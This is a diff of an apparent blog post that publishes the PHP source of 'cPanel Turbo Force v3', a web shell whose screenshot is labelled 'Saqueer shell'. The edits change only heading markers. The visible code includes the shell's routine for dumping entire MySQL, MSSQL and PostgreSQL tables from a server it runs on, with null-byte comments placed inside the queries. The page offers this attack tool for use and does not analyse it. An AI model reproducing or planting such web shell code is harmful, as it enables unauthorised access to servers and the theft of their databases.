@@ -12,7 +12,7 @@ tags:
 ---
 cPanel Turbo Force v3 &#8211; Coded By SaQEeR aL jNoOoB
 
-## cPanel Turbo Force v3 Source Code
+### cPanel Turbo Force v3 Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
 
@@ -164,27 +164,27 @@ $this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
  return 0; }
  function dump($table) 
  {
- if(empty($table)) return 0; $this-&gt;dump=array(); $this-&gt;dump[0] = '##'; $this-&gt;dump[1] = '## --------------------------------------- '; $this-&gt;dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this-&gt;dump[3] = '## Database: '.$this-&gt;base; $this-&gt;dump[4] = '##    Table: '.$table; $this-&gt;dump[5] = '## --------------------------------------- '; switch($this-&gt;db) 
+ if(empty($table)) return 0; $this-&gt;dump=array(); $this-&gt;dump[0] = '###'; $this-&gt;dump[1] = '### --------------------------------------- '; $this-&gt;dump[2] = '###  Created: '.date ("d/m/Y H:i:s"); $this-&gt;dump[3] = '### Database: '.$this-&gt;base; $this-&gt;dump[4] = '###    Table: '.$table; $this-&gt;dump[5] = '### --------------------------------------- '; switch($this-&gt;db) 
  {
- case 'MySQL': $this-&gt;dump[0] = '## MySQL dump'; if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'].";"; $this-&gt;dump[] = '## --------------------------------------- '; if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
+ case 'MySQL': $this-&gt;dump[0] = '### MySQL dump'; if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'].";"; $this-&gt;dump[] = '### --------------------------------------- '; if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
  {
  foreach($this-&gt;rows[$i] as $k=&gt;$v) 
  {
 $this-&gt;rows[$i][$k] = @mysql_real_escape_string($v);}
  $this-&gt;dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this-&gt;columns).'`) VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
- break; case 'MSSQL': $this-&gt;dump[0] = '## MSSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
+ break; case 'MSSQL': $this-&gt;dump[0] = '### MSSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
  {
  foreach($this-&gt;rows[$i] as $k=&gt;$v) 
  {
 $this-&gt;rows[$i][$k] = @addslashes($v);}
  $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
- break; case 'PostgreSQL': $this-&gt;dump[0] = '## PostgreSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
+ break; case 'PostgreSQL': $this-&gt;dump[0] = '### PostgreSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
  {
  foreach($this-&gt;rows[$i] as $k=&gt;$v) 
  {
 $this-&gt;rows[$i][$k] = @addslashes($v);}
  $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
- break; case 'Oracle': $this-&gt;dump[0] = '## ORACLE dump'; $this-&gt;dump[] = '## under construction'; break; default: return 0; break; }
+ break; case 'Oracle': $this-&gt;dump[0] = '### ORACLE dump'; $this-&gt;dump[] = '### under construction'; break; default: return 0; break; }
  return 1; }
  function close() 
  {
@@ -741,7 +741,7 @@ echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
 	&lt;p&gt;nbsp;
 </pre>
 
-## Saqueer shell screenshot<figure id="attachment_440" style="width: 541px;" class="wp-caption aligncenter">
+### Saqueer shell screenshot<figure id="attachment_440" style="width: 541px;" class="wp-caption aligncenter">
 
 [<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/Saqueer-shell-541x1024.png" alt="Saqueer shell screenshot" width="541" height="1024" class="size-large wp-image-440" />][1]<figcaption class="wp-caption-text">Saqueer shell screenshot</figcaption></figure>
 
